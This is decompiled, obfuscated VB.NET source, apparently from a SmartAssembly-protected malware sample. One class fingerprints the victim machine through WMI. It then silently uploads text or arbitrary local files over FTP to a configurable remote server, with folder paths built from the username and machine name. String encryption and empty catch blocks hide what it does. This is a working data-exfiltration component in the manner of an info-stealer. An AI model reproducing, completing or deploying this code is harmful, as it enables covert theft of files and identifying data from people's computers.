Imports System
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Text
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace jtAYXTgtXeY
	' Token: 0x02000013 RID: 19
	Friend NotInheritable Class spnUuIqUXRqcZl
		' Token: 0x06000060 RID: 96 RVA: 0x0000C6C4 File Offset: 0x0000A8C4
		Public Shared Function FElfRhenGQgSXQR() As String
			Dim text As String = String.Empty
			Dim text4 As String
			Try
				Dim managementClass As ManagementClass = New ManagementClass(spnUuIqUXRqcZl.getString_0(107402823))
				Dim instances As ManagementObjectCollection = managementClass.GetInstances()
				Using enumerator As ManagementObjectCollection.ManagementObjectEnumerator = instances.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim managementObject As ManagementObject = CType(enumerator.Current, ManagementObject)
						text = managementObject.Properties(spnUuIqUXRqcZl.getString_0(107402770)).Value.ToString()
					End If
				End Using
				Dim text2 As String = spnUuIqUXRqcZl.getString_0(107402785)
				Dim managementObject2 As ManagementObject = New ManagementObject(spnUuIqUXRqcZl.getString_0(107402748) + text2 + spnUuIqUXRqcZl.getString_0(107402707))
				managementObject2.[Get]()
				Dim text3 As String = managementObject2(spnUuIqUXRqcZl.getString_0(107402734)).ToString()
				text4 = text3
			Catch ex As Exception
				text4 = If(String.IsNullOrEmpty(text), spnUuIqUXRqcZl.getString_0(107388839), text)
			End Try
			Return text4
		End Function

		' Token: 0x06000061 RID: 97 RVA: 0x0000C7E8 File Offset: 0x0000A9E8
		Public Shared Sub quVkiAdPaq(Optional KUSgWdTluWxFbS As String = "URL", Optional jEyxzWAUBNe As String = "USERNAME", Optional mfgEJmofickxF As String = "ACCESO", Optional mFxpbPbMMxFozj As String = "")
			Try
				Dim text As String = spnUuIqUXRqcZl.FElfRhenGQgSXQR()
				Dim ftpWebRequest As FtpWebRequest = CType(WebRequest.Create(String.Concat(New String() { KUSgWdTluWxFbS, spnUuIqUXRqcZl.getString_0(107403897), Environment.UserName, spnUuIqUXRqcZl.getString_0(107403916), Environment.MachineName, spnUuIqUXRqcZl.getString_0(107403863), text, spnUuIqUXRqcZl.getString_0(107403858) })), FtpWebRequest)
				ftpWebRequest.Method = spnUuIqUXRqcZl.getString_0(107402677)
				ftpWebRequest.Credentials = New NetworkCredential(jEyxzWAUBNe, mfgEJmofickxF)
				Dim asciiencoding As ASCIIEncoding = New ASCIIEncoding()
				Dim bytes As Byte() = asciiencoding.GetBytes(mFxpbPbMMxFozj)
				ftpWebRequest.ContentLength = CLng(bytes.Length)
				Using requestStream As Stream = ftpWebRequest.GetRequestStream()
					requestStream.Write(bytes, 0, bytes.Length)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000062 RID: 98 RVA: 0x0000C8FC File Offset: 0x0000AAFC
		Public Shared Sub fSVzpNIUKCgbP(Optional PmVEfNGIimXzPA As String = "URL", Optional infijLYmbDYV As String = "USERNAME", Optional XEtckYNCyxwoP As String = "ACCESO", Optional NdvhRDWDfzYimT As String = "")
			Try
				Dim text As String = spnUuIqUXRqcZl.FElfRhenGQgSXQR()
				Dim ftpWebRequest As FtpWebRequest = CType(WebRequest.Create(String.Concat(New String() { PmVEfNGIimXzPA, spnUuIqUXRqcZl.getString_0(107403897), Environment.UserName, spnUuIqUXRqcZl.getString_0(107403916), Environment.MachineName, spnUuIqUXRqcZl.getString_0(107403863), text, spnUuIqUXRqcZl.getString_0(107403863), Path.GetFileName(NdvhRDWDfzYimT) })), FtpWebRequest)
				ftpWebRequest.Method = spnUuIqUXRqcZl.getString_0(107402677)
				ftpWebRequest.Credentials = New NetworkCredential(infijLYmbDYV, XEtckYNCyxwoP)
				Dim array As Byte() = File.ReadAllBytes(NdvhRDWDfzYimT)
				ftpWebRequest.ContentLength = CLng(array.Length)
				Using requestStream As Stream = ftpWebRequest.GetRequestStream()
					requestStream.Write(array, 0, array.Length)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000064 RID: 100 RVA: 0x000028E6 File Offset: 0x00000AE6
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(spnUuIqUXRqcZl))
		End Sub

		' Token: 0x04000091 RID: 145
		<NonSerialized()>
		Friend Shared getString_0 As GetString
	End Class
End Namespace
